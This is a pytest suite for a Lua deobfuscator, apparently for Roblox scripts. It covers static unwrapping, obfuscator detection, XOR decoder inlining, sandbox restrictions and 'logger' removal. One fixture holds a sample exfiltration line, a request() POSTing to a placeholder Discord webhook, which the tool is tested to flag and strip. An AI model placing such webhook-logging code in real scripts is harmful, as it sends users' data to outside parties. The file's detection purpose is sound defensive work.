import pytest

from deobf import deobfuscate, detect, logger, passes, sandbox, trace_behavior


def test_escapes_and_char_and_concat():
    out, _ = passes.run_static('local s=string.char(72,105).."\\x21".."\\120"')
    assert out == 'local s="Hi!x"'


def test_numbers_do_not_touch_calls():
    out, _ = passes.run_static("local n=(1+2)*(0x10-1) print(f(1+2))")
    assert out == "local n=3*15 print(f(1+2))"


def test_string_table_inline():
    out, _ = passes.run_static('local T={"a","b"} print(T[2],T[1])')
    assert 'print("b","a")' in out


def test_strings_untouched_by_passes():
    src = 'print("(1+2)", [[string.char(65)]])'
    assert passes.run_static(src)[0] == src


def test_static_unwrap():
    assert passes.unwrap_static('return loadstring("print(1)")()') == "print(1)"


def test_detect_wearedevs():
    ranked, _ = detect("--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)end)(...)")
    assert ranked[0][0] == "wearedevs"


def test_layer_capture_and_logger():
    inner = 'request({Url="https://discord.com/api/webhooks/1/abc",Method="POST",Body="x"})'
    esc = "".join("\\%d" % b for b in inner.encode())
    r = deobfuscate('return loadstring("%s")()' % esc)
    assert r.layers == 1 and r.source == inner and r.is_logger
    clean, _ = logger.remove(r.source)
    assert "discord.com" not in clean


def test_sandbox_time_limit_keeps_captures():
    r = sandbox.run('loadstring("print(1)")() while true do end', seconds=2)
    assert r.captures == ["print(1)"]


def test_sandbox_blocks_host_access():
    r = sandbox.run('print(io, os.execute, debug.sethook ~= nil, getfenv()==_G)')
    assert r.prints == ["nil\tnil\ttrue\tfalse"]


def test_trace():
    text, _ = trace_behavior('game:GetService("Players").LocalPlayer.Name="x"')
    assert 'game:GetService("Players")' in text


def _xor_enc(text, key):
    return "".join(chr(ord(c) ^ ord(key[(i + 1) % len(key)])) for i, c in enumerate(text))


def _lit(s):
    return '"' + "".join("\\%d" % ord(c) for c in s) + '"'


DECODER = (
    "local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;"
    "local v5=table.concat;local v6=table.insert;"
    "local function v7(v21,v22)local v23={};for v24=1, #v21 do "
    "v6(v23,v0(v4(v1(v2(v21,v24,v24+1 )),v1(v2(v22,1 + (v24% #v22) ,1 + (v24% #v22) + 1 )))% 256 ));end return v5(v23);end "
)


def test_xor_decoder_inlined():
    body = 'local p=game:GetService(%s).LocalPlayer print(%s,%s)' % tuple(
        "v7(%s,%s)" % (_lit(_xor_enc(t, "k3y")), _lit("k3y")) for t in ("Players", "hello", "world")
    )
    src = "--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)" + DECODER + body + " end)(...)"
    r = deobfuscate(src)
    assert 'game:GetService("Players")' in r.source and 'print("hello","world")' in r.source
    assert any(n.startswith("decoder:") for n in r.notes)


def test_numeric_getter_with_rotation_table():
    src = 'local T={"\\x61","\\x62","\\x63"} local function g(i) return T[i] end print(g(1),g(2),g(3))'
    r = deobfuscate(src)
    assert 'print("a","b","c")' in r.source


def test_bit32_is_real():
    r = sandbox.run("print(bit32.bxor(5,3),bit32.band(12,10),bit32.bor(12,10),bit32.lshift(1,4),bit32.rshift(256,4))")
    assert r.prints == ["6\t8\t14\t16\t16"]
